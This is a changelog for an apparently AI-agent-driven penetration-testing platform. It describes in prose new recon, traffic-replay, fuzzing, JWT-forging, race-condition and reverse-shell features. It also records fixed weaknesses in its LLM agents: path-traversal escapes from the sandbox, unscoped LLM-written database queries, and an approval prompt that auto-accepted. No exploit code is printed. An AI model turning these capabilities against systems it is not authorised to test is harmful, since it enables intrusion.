# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

## [6.15.0] - 2026-09-12

### Added

- **Authenticated Session Recording: one logged-in identity per project.** Most of an application only exists after login. Set the session once and every consumer attaches it to in-scope hosts: httpx, katana, hakrawler, ffuf, the ZAP Ajax Spider, arjun, kiterunner, nuclei, the AI-surface and GraphQL probes, partial recon, and the agent's replay, browser and `execute_curl`. Record it by driving your own browser through the capture proxy and logging in once, or paste a cookie, bearer token or headers by hand. Two switches pick who uses it (recon and agent, independently), so the agent can stay anonymous for access-control testing. On a lab target the same scan found 2 URLs logged out and 198 logged in. The value is write-only and never returned to a browser; it attaches only to in-scope hosts, and since most tools apply one header set to a whole targets file, one out-of-scope host means it attaches to none of them. With a session attached nuclei drops OAST and redirects are confined to the same host, because a public collector and a cross-host redirect are both off-scope. See [Authenticated Session Recording](https://github.com/samugit83/redamon/wiki/Authenticated-Session-Recording).

### Changed

- **Priority Board and CypherFix are one job with one result.** Three buttons ran one job with two halves that ignored each other: the board ordered by a points formula while CypherFix's fix list came from a second LLM run with its own priorities that, on a large project, never saw most findings. Now one button, one run, one result both pages read.

  **The points formula is gone.** Adding up signals counted one fact several times, summed signals that mean the same thing, and added impact to likelihood when risk is impact times likelihood. The new model estimates four probabilities and multiplies them (real, exploited, impact, reachable), then fixed rules place the finding in one of four tiers built into the 0-100 score, so a bigger number always means more urgent. Every row shows the four factors and the fact each came from. On the worst-affected project NDCG@25 went from -0.30 to 1.00, and eight "IP Address (Private)" GitHub "secrets" left the top 25, replaced by actual credentials.

  **The AI now corrects rather than narrates.** It reads the evidence a scanner captured and adjusts the four factors against it, which rules cannot do: a nuclei "exposed .env" whose stored response is the site's own homepage is a false positive, and only the body reveals that. Quotes are verified as substrings of what it was sent, numbers are clamped, only eight named facts can be disputed, a proven finding cannot be talked down, and it binds no tools.

  **The board learns from Real and False positive clicks.** Each verdict counts against the detector that produced the finding, and that detector's "real" factor becomes a Beta posterior with the detection rule as prior. Ten labels move it halfway, so one click cannot re-rank a board; it never crosses users and never talks down something an exploit proved.

  **Fix items are linked to their findings**, so findings sharing a fix are grouped and upserted by group in one transaction, and anything dismissed or in progress is never rewritten. **A run is a first-class row**, so version activation, delta preview, import and delete can see one and wait; everything stays in memory until the last step, so a stopped run leaves the previous ranking intact. Three settings no code read are replaced by one that does: **Priority Board: findings the AI reviews** (0 for a fully ranked, AI-free board).

### Security

- **The triage agent's `query_graph` ran LLM-written Cypher unscoped, in a write session**, while its docstring claimed tenant filtering. It now goes through the same chokepoint as the main agent in a read-only session, and both LLM tools have been removed from triage entirely. Two triage queries also read other tenants' data by traversing the shared, tenant-key-less `CVE` node; both are anchored.
- **The CodeFix agent's filesystem tools had no path confinement.** `../` and absolute paths escaped the checked-out repo into the agent container, whose environment holds the Neo4j password and internal API key. Every path now resolves through one helper that refuses absolute paths, parent traversal and out-pointing symlinks.
- **CodeFix took its repository from LLM-written remediation text**; it comes from `targetRepo` in project settings. A session also accepted any remediation id, including another project's, and is now bound to its ticket's project.
- **An unanswered CodeFix approval prompt auto-ACCEPTED after five minutes.** It rejects, and a rejected edit is reverted on disk rather than left to be committed.
- **Provider exceptions reached the browser** and were logged with unredacted tracebacks, which is where an SDK puts the key it was called with. Also: `/graph/triage` refuses with 503 when `INTERNAL_API_KEY` is unset or `changeme`, and the remediations route works from a whitelist instead of spreading the request body into the update.

### Fixed

- **The agent's exploitation proof never reached the recon graph.** Chain-writer CVE matches supplied tenant keys, but `CVE` is a shared node that carries none, so every match failed and the board could never show a proven finding.
- **A rescan deleted everything you had decided about a finding.** Scanners deleted their findings up front and re-created them, taking the mute, the verdict, the cached AI review and the link from a fix item with them. Scans now refresh what they still report and remove only what they stopped reporting.
- **Two projects scanning the same target collided.** Per-project findings were unique on `id` alone, so one project's scan took over the other's node or lost it to a swallowed constraint error. It is also why importing a project export deleted the project it came from.
- **Writers destroyed each other's facts.** A crawl set `is_injectable = false` unconditionally, undoing what a fuzzing run proved; JS recon overwrote the HTTP probe's `status_code`, so a live endpoint could read as unreachable; and the AI-surface writer erased its own evidence (`SET v += $props` with None removes the property, and its `COALESCE` arguments were reversed).
- **`nmap_nse` findings had no id**, so triage could never mute, judge or fix one. A GVM finding that came back stayed "remediated" for ever, and one project's CriminalIP reading overwrote another's NVD score on the shared CVE node.
- **`RESOLVES_TO` and `WAF_BYPASS_VIA` were duplicated on every run**, because `datetime()` sat inside the MERGE pattern and is part of the key. Separately, every GraphQL vulnerability was dropped when no endpoint was confirmed (`urlparse` imported inside one branch), and an OSINT handler raised on an undefined `logger`, taking the batch with it.

## [6.14.1] - 2026-09-09

### Fixed

- **`./redamon.sh update` no longer refuses to pull after a scan, and its error no longer makes the problem permanent** ([#185](https://github.com/samugit83/redamon/issues/185)). RedAmon was dirtying its own checkout: `recon/` is bind-mounted read-write into the spawned recon container, and two **git-tracked** data directories are re-downloaded there on a 24h cache miss -- `recon/main_recon_modules/data/mitre_db/` (the MITRE CVE/CAPEC/CWE database, written by `add_mitre.py`) and `recon/main_recon_modules/data/wappalyzer_cache/` (the Wappalyzer fingerprints, written by `http_probe.py`). So a scan or two left tracked files modified and `git pull --ff-only` refused. `update` was supposed to restore those before pulling, but `RUNTIME_TRACKED_PATHS` listed only the `.last_update` marker, which had since been gitignored and was therefore untracked -- the restore was dead code while the 16 files beside it drifted. It now covers both directories. Worse than the refusal was the advice: the error told users to run `git commit -am 'local changes'`, which is precisely what converts a self-healing dirty tree into a permanent dead end, because the checkout then holds a commit the project does not and no fast-forward can ever pass it again. At that point the message was also simply false, still claiming "the working tree has local changes" while `git status` was provably empty. That suggestion is gone, and the dirty-tree branch now warns against it explicitly ([68d0d906]).
- **`update` tells the four failure modes apart instead of blaming local changes for all of them.** A diverged branch, a genuinely dirty tree, a checkout with no git remote (a zip download rather than a clone) and a transport/auth failure each get their own diagnosis and their own runnable recovery command; the last of these now prints git's own message rather than guessing. A checkout diverged **only** by committed runtime files repairs itself and reports what it discarded, so the update completes instead of stranding the user. That reset is the single destructive step in `update` and is gated four ways -- the working tree must be clean, `git status` must be readable, every path in the diverging commits must sit under a RedAmon runtime data directory, and no path may contain a traversal -- with `REDAMON_NO_AUTO_RESET=1` to disable it outright. Anything touching real work stops the update with instructions that preserve it ([68d0d906]).
- **A mixed root/user checkout now fails fast with the one command that fixes it.** An earlier `sudo ./redamon.sh install` (or the `sudo git commit` the old message provoked) leaves root-owned files in a user-owned clone, and the next non-root run failed piecemeal: git could not rewrite `.git/index`, `_gpu_export_env` could not write `.torch-variant`, and none of the errors pointed at the cause. `update` now checks up front and stops with the `chown`, `install` warns at the point the mistake is made, and a runtime data file that is clean but root-owned is flagged **before** a release that changes it makes `git pull` fail with `unable to unlink ... Permission denied`. A restore that cannot write its target no longer swallows the failure ([68d0d906]).

### Note

A checkout that has **already** diverged still needs one manual recovery, because the fix ships inside `redamon.sh` -- the very file such a checkout cannot pull:

```bash
cd ~/redamon
sudo chown -R "$(id -un):$(id -gn)" .   # only if an earlier run used sudo
git fetch origin
git reset --hard origin/master
./redamon.sh update
```

From this release on it is automatic. See [docs/readmes/TROUBLESHOOTING.md](docs/readmes/TROUBLESHOOTING.md) for the symptom table.

## [6.14.0] - 2026-09-08

### Added

- **Priority Board: a ranked list of every finding, with muting that actually hides.** A new page under the graph that pulls all eight finding types (network + DAST vulnerabilities, secrets, JS-recon, multiscanner, supply-chain packages, GitHub secrets and sensitive files) into one table and orders them by how much they matter, worst first. A deterministic Python scorer does the ranking off signals it reads straight from the graph -- a confirmed exploit or a successful attack-chain step outranks a CISA-KEV CVE, which outranks a live DAST hit with a stored proof-of-concept, which outranks an injectable parameter, and header-hygiene facts (a missing DMARC record, say) sink to the bottom instead of being flagged "needs verification". Each row shows the exact signals that fired as chips (`KEV`, `exploited`, `DAST`, `injectable`, `agent-failed`), so the position is transparent, and a finding the agent actually broke into is marked proven from the graph, never from a guess. Muting a finding adds a `:Muted` label that removes it everywhere it counts -- the graph view, the agent's own queries, analytics, RedZone, reports and export -- while a re-scan still matches the same node so nothing duplicates and unmute is lossless; enforcement lives at the single tenant-isolation chokepoint so no read path can leak a muted node. Runs in the background and survives you leaving the page: re-open the tab and it re-attaches to the run in flight, and only an explicit Stop cancels it. A large language model, when a key is configured, is used only to cluster cross-tool duplicates and write a one-line "why it matters" for the top findings; with no key the ranking is still complete and correct.

- **Origin-IP Discovery: unmask the real server behind a CDN/WAF.** A new GROUP 6 Phase A recon module (parallel with Nuclei, GraphQL, Subdomain Takeover, VHost & SNI, Web Cache Poisoning) that gathers candidate origin IPs from many fingerprints (non-CDN subdomains, SPF/MX records, crt.sh SANs, the favicon hash, the internet-wide scanners Shodan/Censys/FOFA/ZoomEye/OTX/VirusTotal, and SecurityTrails/ViewDNS passive DNS), then confirms each by fetching it directly and Host-header-forged and scoring HTML + TLS cert + headers against the fronted site. Fail-closed SSRF / CDN-range / RoE filters before any probe, a per-scan search budget, and a confirmed origin written as a `HAS_ORIGIN` edge and a `waf_bypass` Vulnerability node (converging with the WAF-bypass security check via a tenant-scoped id). Runs in the full pipeline and as a standalone partial recon; disabled by default.

## [6.13.1] - 2026-09-07

### Fixed

- **"Test Connection" no longer blames your LLM endpoint when the agent is down** ([#184](https://github.com/samugit83/redamon/issues/184)). Adding an OpenAI-compatible provider and pressing Test surfaced `TypeError: fetch failed` directly under the Base URL field, so an agent-container outage read as "your endpoint is wrong". The webapp does not dial your model itself; it proxies to the `agent` container, which does, so a missing agent failed with `getaddrinfo ENOTFOUND agent` before your endpoint was ever contacted. Every webapp→agent call now goes through one wrapper that classifies transport failures and returns a 503 naming the real cause ("the agent container is not running... `docker compose ps -a agent`... this is not a problem with the endpoint you configured"), logged verbatim server-side too. The LLM Providers form preflights the agent and, when it is down, shows a banner with a Re-check button and disables Test before you can click. Also fixed on this path: a wrong `localhost:8090` fallback (nothing listens there from inside the container), a missing request timeout so a hung agent no longer hangs the route, and a per-request budget derived from the provider's own Timeout setting so a slow first-token model is not cut short and then misreported as an agent timeout.
- **Kali sandbox no longer crash-loops on start after an upgrade** ([#181](https://github.com/samugit83/redamon/issues/181)). Every MCP tool server (network_recon, nuclei, metasploit, nmap, playwright) died on import with `ImportError: FastMCP server support is not installed` / `No module named 'mcp.server.request_state'`, so the RedAmon Terminal could never connect ("WebSocket connection failed. Is the kali-sandbox running?"). Root cause: `fastmcp` and `mcp` were unpinned, so on the `kali-rolling:latest` base (now Python 3.14) `fastmcp` resolved to the 4.x `fastmcp-slim` split, whose server code imports `mcp.server.request_state` (only in `mcp>=2.0`), while a later `pip install semgrep` in the same shared venv hard-pins `mcp==1.29.0` and silently downgraded it, with the build still exiting 0. Pinned the matched pair `fastmcp==3.2.4` + `mcp==1.29.0` (3.2.4 is the newest fastmcp still compatible with `mcp<2.0`, so it coexists with semgrep and does not import `request_state`).

### Changed

- **`redamon.sh status` no longer hides a stopped core service** ([#184](https://github.com/samugit83/redamon/issues/184)). It used a bare `docker compose ps`, which omits exited containers, so a crashed `agent` simply vanished from the table and the stack looked healthy while the UI failed with `ENOTFOUND agent`. It now uses `docker compose ps -a` and prints an explicit "Core services NOT running" section naming each stopped service with the command to inspect it; on a clone that was never installed it points the user at `./redamon.sh install` rather than mislabelling a fresh checkout as an outage.
- **The kali-sandbox build now guards against this class of dependency skew** ([#181](https://github.com/samugit83/redamon/issues/181)). A global pip constraints file (`mcp/kali-sandbox/pip-constraints.txt`, wired via `PIP_CONSTRAINT`) binds *every* `pip install` in the image, so a later isolated install can no longer silently downgrade a pinned library without failing the build; and a build-time smoke test imports `FastMCP` plus all five MCP server modules as the last step, turning any future skew into a hard build failure instead of a runtime crash-loop.

## [6.13.0] - 2026-09-01

### Added

- **The agent auto-detects and suggests the reverse-shell LHOST** ([#180](https://github.com/samugit83/redamon/issues/180)). `redamon.sh` detects the Docker host's LAN IP on every `install`/`update`/`up` and passes it to the agent, which now proposes it when LHOST is unset -- in chat, and as a **"Detected (default route) -- Use this"** one-click fill in the Agent Behaviour settings (project form and the in-graph settings drawer) -- instead of guessing the unreachable `172.x` sandbox address. The value is IPv4-only, never persisted (so it re-detects on a network change), and overridable with `HOST_LAN_IP=<ip>` in `.env` for VPN / multi-homed hosts. Served by a new read-only agent endpoint `GET /host-ip` behind the JWT-gated webapp proxy ([b8e11cbf]).

### Fixed

- **Reverse-shell LHOST guidance no longer points at the wrong address** ([#180](https://github.com/samugit83/redamon/issues/180)). The agent's tools run inside `kali-sandbox` on a private `172.x` bridge a target cannot reach; the reachable address is the host's LAN IP, with port `4444` forwarded host->container. The settings hint, the agent's own prompt, and the docs now say so (previously a hint suggested a `172.x` container address), and `iproute2` is installed in the sandbox so the agent's `ip addr` probe no longer fails with "command not found" ([b8e11cbf]).

## [6.12.0] - 2026-08-29

### Added

- **`proxy_brain`: the agent's Burp Suite in code.** A single code-as-action tool replaces the ten former `proxy_*` traffic tools. Instead of a fixed menu of narrow commands, the agent writes Python against a pre-imported `redamon` SDK and composes the attack itself (loops, conditionals, crypto, oracles), so anything Burp does (Repeater, Intruder, Comparer, Sequencer, Decoder, JWT Editor, Autorize, Turbo Intruder) is a few lines over the captured [TrafficMind](docs/readmes/README.TRAFFIC.md) corpus. It runs in the kali-sandbox but holds **no database credential**: it reaches the corpus only through the agent's `/traffic/exec` (read) and `/traffic/replay` (active PREPARE) endpoints, the same broker pattern the graph terminal uses, so a foothold in the sandbox cannot touch the store directly ([8096c72a], [2420322d]).
- **The `redamon` SDK.** Read ops (`search`, `get`, `sitemap`, `params`, `grep`, `diff`, `to_curl`, `query`) in any phase, pure crypto (`decode`, `jwt(tok).forge(...)`), and active ops (`replay`, `batch(parallel=True)`, `fuzz`) gated to the exploitation phases. `batch(parallel=True)` fires prepared sends concurrently over a real thread pool, a genuine race-condition window (limit overrun, double-spend, coupon reuse) ([4c844d93]).
- **An on-demand operator's manual the agent reads from its own code** via `redamon.manual()` (core map, under 8k) and `redamon.manual("<technique>")` (one deep section), so the cookbook never bloats the prompt. Twenty technique sections ship: recon, intruder, sqli, authz, jwt, race, smuggling, cache, injection, decode, sequencer, flows, report, nosql, graphql, lfi, cmdi, cors, xxe, auth ([4c844d93], [90f232fc]).
- **A deliberately vulnerable practice target, `testing/guinea_pigs/proxy_brain_target/`** (`pbtarget`), with one endpoint per technique (IDOR, SQLi, reflected XSS, a JWT weak-secret flag, a single-use coupon race, open redirect, CORS, command injection) for end-to-end validation ([ab2708f0]).
- **Explicit domain-vs-IP targeting in the project form** ([#179](https://github.com/samugit83/redamon/issues/179)). Target mode is now a two-card selector (Domain / Hostname vs IP / CIDR) that separates how a target is named from where it lives, with private/RFC1918 detection warnings and an in-form note on which recon steps are domain-only and skipped in IP mode ([96e3a51a]).
- **An "Internal Network & Active Directory" recon preset:** IP mode, AD / internal-service ports, Nmap NSE, LAN-safe masscan rate, and public-only tools (OSINT, subdomain enumeration, WHOIS) turned off. Every preset is now tagged with a `targetProfile` + `environment`, the preset picker gains a target-type filter (All / Domain / External IP / Local network) with classification chips, and applying a preset drives the `ipMode` toggle from its profile (create mode only, non-destructive) ([96e3a51a]).

### Changed

- **Security invariants on active sends are enforced in code on the agent side**, so a compromised sandbox cannot bypass them by editing its own script: replays are host-pinned to the origin transaction (`_origin_url` forces a rooted path and asserts the rebuilt netloc matches, else refuses), the `/traffic/replay` endpoint gates sends to the exploitation phases from the verified tag, a per-session send budget (`TRAFFIC_REPLAY_BUDGET`, default 1000) caps one confirmed run, and stealth mode holds back fuzz / batch / rapid replay ([902bef59]).
- **Tenant isolation travels as an HMAC-signed tag** the agent mints and the endpoint verifies against `INTERNAL_API_KEY` (which the kali worker does not hold), failing closed on a missing key or claim; every read still hard-injects the project + user filter and the `query` op remains a constrained builder with no raw-SQL surface ([8096c72a], [902bef59]).
- **The agent tool registry, phase map, dangerous-tools set, prompts, and all built-in and community skills** now reference the single `proxy_brain` tool and its SDK instead of the removed `proxy_*` names ([0b41c9d4]). The README, `README.TRAFFIC.md` (section 13 rewritten to the broker architecture), `README.AGENTIC_SYSTEM.md`, and the wiki are updated to match, with a new dedicated Proxy Brain wiki page.

### Fixed

- **`proxy_brain` now pre-imports the `redamon` SDK into the child interpreter**, fixing a live-session `NameError: name 'redamon' is not defined` when agent code used the SDK without importing it; a source-AST regression test guards the wrapper contract ([533285e5], [b9822170]).
- **Manual recipes corrected after a deep review:** the authz recipe compared against a replay baseline (not formatted `get()` text that never matches), the request-smuggling recipe was rewritten as find-candidates plus a `kali_shell` confirm (curl and the proxy normalise CL/TE framing), JWT forging uses the public `jwt().forge()` rather than a private helper, and GraphQL alias payloads use `json.dumps` ([be19c83b]).
- **`redamon.search` accepts both a filters dict and keyword arguments**, so `search({...})` and `search(host=...)` both work ([0b41c9d4]).

### Removed

- **The ten `proxy_*` agent tools** (`proxy_search`, `proxy_get`, `proxy_sitemap`, `proxy_params`, `proxy_grep`, `proxy_diff`, `proxy_to_curl`, `proxy_query`, `proxy_replay`, `proxy_fuzz`) and their in-process dispatch (`_run_active_proxy` and the executor intercepts), fully superseded by `proxy_brain` ([2420322d]).

## [6.11.6] - 2026-08-27

### Added

- **New built-in agent skill: Cryptographic Attacks (`crypto_attack`).** A first-class attack class for breaking a cryptographic construction the target trusts -- decrypting or forging a cookie / token / signature / MAC via CBC padding oracles and bit-flipping, ECB analysis, stream / nonce reuse (two-time pad), JWT signature attacks (`alg:none`, HS/RS confusion, weak-secret cracking, `kid` / `jwk` / `jku`), hash length extension, RSA weaknesses, and predictable-token / PRNG reconstruction. Classified by the Intent Router, injected into the exploitation-phase prompt, toggleable per project, and badged **CRYPT**. Attacks are scripted in `execute_code` (PyCryptodome / pwntools / PyJWT) backed by `openssl` / `jwt_tool` / `hashcat` in kali-sandbox. Content is fairness-clean (generic crypto tradecraft only) and covered by a 41-test suite.

## [6.11.5] - 2026-08-23

### Added

- **Per-session agent logs and a machine-readable event stream.** Each session writes its own `agent.<session_id>.log` instead of one shared file, alongside an `agent.<session_id>.events.jsonl` stream carrying `decision` / `tool_result` / `flag_captured` events with timings, provider and token counts. Toggles: `LOG_PER_SESSION`, `LOG_EVENT_STREAM`, `LOG_LLM_VERBOSE`, `LOG_TOOL_OUTPUT_MAX_CHARS` ([663424bf]).
- **`install` / `update` accept `--gpu` / `--cpu`.** The PyTorch variant is decided once at build time and frozen in `.torch-variant`; every later command obeys that marker instead of re-probing the hardware. With neither flag the NVIDIA *container runtime* is auto-detected, since a card without nvidia-container-toolkit can never be handed to a container. `status` reports `TORCH_BUILD` ([7fda7514]).

### Changed

- **PyTorch is pinned to the CPU wheel, cutting ~11 GB of unused CUDA libraries.** `pip install torch` resolves to the CUDA build by default, vendoring ~2.5 GB of `nvidia-*` runtime per install site across four sites, none of which used a GPU: KB embeddings run on CPU and the AI-attack-surface tools route inference to the local Ollama. `redamon-ai-attack-surface` drops 16.29 GB to 9.17 GB (-43.7%) and the agent's KB torch layer 5.49 GB to 1.50 GB (-72.7%). All three scanner venvs are pinned (giskard pulled torch too, via `bert-score`); both Dockerfiles now fail the build if the resulting torch does not match the requested variant, so a future dependency bump cannot silently restore the bloat ([7fda7514]).
- **Attack-chain node colours carry the ranking** instead of five types sharing one amber: vivid orange for `ChainFinding`, amber for the chain root, grey for steps, amber-900 for decisions and grey-red for failures, so a dead end cannot read as a success. Insights charts now read the same `--node-chain-*` tokens ([01062dbc]).
- **Agent log noise is down roughly 90%:** the system prompt is dumped once per session rather than every turn, raw LLM responses are gated behind a toggle, and tool output in the prose log is capped (the full body still reaches the offload and the DB) ([663424bf]).

### Fixed

- **Badge text was unreadable on 18 of the 43 node colours** (Capec yellow at 1.9:1). Badges keep the palette colour, since it is the node's identity on the canvas, and pick whichever of white or near-black scores higher; only a mid-luminance colour no text can clear is nudged darker. A test loops the whole palette so a new colour that cannot reach WCAG AA fails there instead of shipping ([35a3de0f]).

## [6.11.4] - 2026-08-22

### Fixed

- **GVM no longer fails to start with `exit 137` on ordinary hosts** ([#176](https://github.com/samugit83/redamon/issues/176)). The memory governor split `GVM_DATA`'s budget across the eight one-shot feed loaders *after* applying the floor, so each got ~24 MB instead of 192 MB; the loaders `cp -r` a multi-GB Greenbone feed and are SIGKILLed below ~128 MB, and since `gvmd`/`gvm-ospd` are gated on them the whole GVM stack never started (12–32 GB hosts). The per-loader cap is now floored at 512 MB, and the loaders moved to a new **transient** tier excluded from the over-commit budget.
- **`update` re-applies the GVM caps on every GVM-enabled run**, enumerating every `gvm-*` service (plus `gvmd`) from the compose file, so existing installs self-heal — including `gvm-notus-data`, which the old four-service recreate skipped.
- **A GVM loader killed by its cap now says so:** `install`/`up` report which container was OOM-killed and the current `GVM_DATA_MEM`, instead of compose's opaque "didn't complete successfully".

## [6.11.3] - 2026-08-21

### Changed

- **The agent's secret scanner is now betterleaks, the gitleaks successor from the same author (Zach Rice).** It is a drop-in replacement baked into kali-sandbox: it reads the same `.gitleaks.toml`, emits gitleaks-compatible JSON, and adds a `confidence` attribute plus a `--git-workers` flag that parallelises the git-log walk. On an 800-commit history it roughly halves scan time (about 460ms single-process down to about 230ms with `--git-workers 4`) at identical detections. The agent now runs `betterleaks git <repo>` (modern gitleaks dropped the `detect` subcommand); `betterleaks dir <path>` scans a working tree without history.

## [6.11.2] - 2026-08-20

### Added

- **Unseen-row badges on every graph table tab.** Each tab in the table selector carries a count of the rows written since that user last opened it, with the reconciled total beside the selector. Watermarks are per user, per project and per tab, stamped from the graph's clock so a fast browser clock cannot hide the next scan's findings, and a user with no stored watermark is seeded to "now" rather than shown twenty four-digit counts on upgrade day. A badge counts the rows its tab **would show**, by invoking that tab's own route, so a badge and an empty table can never disagree ([66af1f7e], [68eace17]).
- **A sortable `Updated` column on every table backed by the graph.** All ~40 Red Zone sheets, every JS Recon sub-table, All Nodes, the Node Inspector, and the five tables outside the Red Zone (Chain Findings, AI Attack Surface findings, CypherFix remediation, Recon Delta, Version Manager). Always present, newest-first on load, filterable and exported. One shared module owns the descriptor, cell, header and sort so the sheets cannot drift apart; a cross-cutting smoke test fails the build if a new sheet or route drops it ([7cd98aa0], [ba188048], [55e716ef]).
- **The Secrets page shows every source of credentials RedAmon found**, not two of them. `GithubSecret`, `GithubSensitiveFile` and agent-recovered `ChainFinding` credentials join `:Secret` and `:MultiscannerFinding`; on one project that is 293 rows where 8 were visible. Credentials the agent actually logged in with rank top of the table ([b4bd1675]).
- **Start a scan from its own settings section.** GVM, GitHub Secret Hunt, Secret Multiscanner and Supply Chain each get Update Settings / Start to Scan on their header; starting saves in place and lands on that scan's logs, which previously opened *underneath* the modal and made the start look inert ([991792c5]).
- **End-to-end coverage of the Secret Multiscanner GitLab source** against a live account: a create-only fixture builder, a 26-case parameter matrix asserting on published artifacts, a finding-by-finding Neo4j comparison, and a Playwright spec driving every parameter from the form ([98c75b94]).

### Changed

- **`updated_at` is stamped on every node write**, completing the sweep so the `Updated` column is never blank for a row a scan just produced. A plain `SET`, never `ON CREATE SET`: the column means "last written", and frozen at first write it would report a months-old finding as current ([cb79a4f0]).
- **CVE, MitreData and Capec are documented as global reference nodes.** The schema doc still claimed every node carries `user_id` + `project_id`, which stopped being true when the reference labels were unstamped; the three rules that follow had each already been violated in code ([a264fcec]).

### Fixed

- **A recon re-run deleted every other scanner's data.** `clear_project_data` was a bare `MATCH (n) WHERE n.user_id AND n.project_id DETACH DELETE n`, so re-running recon wiped the GitHub Secret Hunt results, the Secret Multiscanner findings, the supply-chain packages (1638 OSV vulnerabilities on one dev box), the GVM results and the agent's attack chains, with no error anywhere. Every clear is now scoped to the scan that owns the data, excluding other subsystems both by label and by `source` on the labels recon shares, `Vulnerability` above all ([062eee5c]).
- **A stopped GitHub Secret Hunt threw away everything it had found.** Every stop arrives as SIGTERM and Python's default handler exits on the spot, so neither `save_results()` nor the Neo4j write ever ran: a stack restart killed a 58-minute scan and turned 14 repos, 4250 files and 799 findings into zero graph nodes. SIGINT was already handled, which hid it, since Ctrl-C saved and a restart did not ([da9bcfdc]).
- **The column filter panel sheared off its right-hand controls.** A 320px `overflow:hidden` dropdown wrapped a 340px panel, so the "not" checkbox and the kind badges sat on or past the edge, and the two boxes disagreed on max-height. The dropdown is now a pure positioning wrapper and the panel owns its width, chrome and scrolling ([3ee32f56]).
- **`--include-repos` is a conjunction of two globs**, applied by TruffleHog to `group/project` while enumerating and again to the clone URL, so a pattern matching one form silently scanned nothing ([98c75b94]).
- **The day-to-day test runner reported a failure the real gate never saw.** `run_tests.sh` built `PYTHONPATH` without `/repo/services`, so `knowledge_base` resolved as an empty namespace package and a healthy test died at collection ([70a55ab7]).

## [6.11.1] - 2026-08-19

### Added

- **Per-source credential drawers on the API Keys settings tab**, grouping the flat credential list into collapsible "GitHub & Supply Chain" and "Secret Multiscanner" cards that summarise what is set and what is missing ([c24694fe]).

### Changed

- **The Supply Chain GitHub token is split from GitHub Secret Hunt's** (`supplyChainGithubToken`), so the two scanners no longer share one PAT and can be scoped and revoked independently; the new column is backfilled from the old one so existing setups keep working ([c24694fe]).

### Fixed

- **The Secret Multiscanner's `github_experimental` (deleted-commit) source could not run at all**, dying with `mkdir /home/trufflehog/.trufflehog: permission denied`: a root-owned `0755` tmpfs mount shadowed the non-root scan user's home, so the mount meant to make `$HOME` writable is what made it unwritable. The home tmpfs is now owned by the scan uid ([51e34adc]).
- **Two Censys inputs on the settings form wrote to the same field**, so typing in one rewrote the other; the duplicate is removed ([c24694fe]).

## [6.11.0] - 2026-08-18

### Added

- **Secret Multiscanner: 14 secret sources, one container each, running in parallel.** The github-only TruffleHog wrapper becomes a registry-driven scanner covering git, GitHub (plus deleted commits), GitLab, Docker registries, Hugging Face, S3, GCS, filesystem, Jenkins, Elasticsearch, Postman, CircleCI and Travis CI. Config moves off the `Project` row into one `TrufflehogScanProfile` per source, so "one run per source" is a database invariant and any number of *different* sources run at once, gated only by the fleet-wide memory governor; orchestrator state, endpoints, SSE streams, Other Scans rows and the per-source UI are all run-keyed. The 19 credentials are flat `UserSettings` columns handed to the container through the environment, never argv, and the container now runs on the hardened shape (isolated bridge, `cap_drop=ALL`, read-only root, non-root uid, exactly one source's credential, no Neo4j credentials), reads a job file instead of calling settings back over HTTP, and leaves graph ingest to the orchestrator as a separate clean step.

  In the graph, one `MultiscannerScan` per project+source with assets grouped by shape (repository, image, model, bucket, endpoint), stable sha1 node ids (the old builtin `hash()` was randomised per process, so the same repo got a new id every run), every MERGE keyed on the `{id, user_id, project_id}` triple, and **per-source** clearing: ingest used to wipe the whole project first, so a finishing Docker scan silently `DETACH DELETE`d every Hugging Face finding and left a perfect JSON artifact behind. Red Zone's secrets table unions Multiscanner findings alongside `:Secret`, ranking a confirmed-live credential above an unvalidated one and keeping "checked and dead" distinct from "never checked". Built across six phases, then hardened by two review passes ([d48e7e33] to [534aabb5]).

- **Local scan targets, so a source can be exercised with no network.** `scanners/scan_targets/` is the one directory a scan container may read from disk, mounted read-only; filesystem, git and docker can take a local fixture without relaxing the egress guard (a `file://` target presents no host, so the guard is a natural no-op). The path is never operator-typed and is refused at three layers: the container carries that source's credential in its job file, so a free-text `file://` target could be aimed at it and the token would come back as a finding.
- **A browsable detector catalogue.** The two detector fields accepted only 1060 exact, case-sensitive names that appeared nowhere in the UI, and a wrong one stops the engine initialising rather than being ignored. Both now have a filterable picker, built from the `DetectorType` enum parsed out of the pinned 3.96.0 binary and fed back to it for validation, so every entry is known-valid rather than plausible.
- **A scanner's Global Settings key can be set without leaving the form**, on the surface where a scan is configured and the one where it is blocked from starting. One catalogue covers all 22 keys (GitHub Secret Hunt, Supply Chain, the 19 Multiscanner credentials); the box starts empty and saves one key at a time, since pre-filling would send the mask back as the new token.
- **The graph toolbar's scan cluster, in the project form**: Download Recon, GVM scan with pause/stop, Download GVM and Other Scans, behind a new `useScanControls` that bundles the ten status/SSE hooks the toolbar's 66 props were assembled from. The GVM button applies the same availability, Stealth Mode and recon-data gates with the same tooltips, so it can no longer look startable on a host with no GVM stack.

### Changed

- **The scanner is "Secret Multiscanner", not "TruffleHog"**, and the graph labels follow: `Trufflehog*` -> `Multiscanner*`, `HAS_TRUFFLEHOG_SCAN` -> `HAS_MULTISCANNER_SCAN`, node id prefixes with them. Existing data is migrated at `init_schema`, because a rename alone does not leave old data unmigrated, it leaves it **invisible**: every read is by label, so a finished scan's findings would vanish from the Red Zone and every report. The migration is idempotent, batched at 10k and marker-guarded (the first cut re-scanned all 21 labels on every client construction, which is every scan-container spawn), and constraint and index *names* move with the label, or the new label would silently have had no uniqueness constraint and lost its tenant-isolation guarantee. Identifiers stay `trufflehog*` on purpose: the UI says Secret Multiscanner, the code names the binary it runs ([b19743c1], [91204ab2]).
- **The Supply Chain input moves into project settings**, next to every other scanner's input, leaving the Other Scans card with run controls only; `SupplyChainInput` is deleted. Organization becomes a persisted input mode that queues one scan per repository (both direct start paths refuse it rather than spawning a container that dies looking for an SBOM) and its name is validated against the operator's registered GitHub host allowlist, like the repository URL.
- The Recon Delta security lenses are fixed at 4 columns with per-lens scrolling; the project form's vertical rhythm is now owned by containers rather than 13 ad-hoc margins.

### Fixed

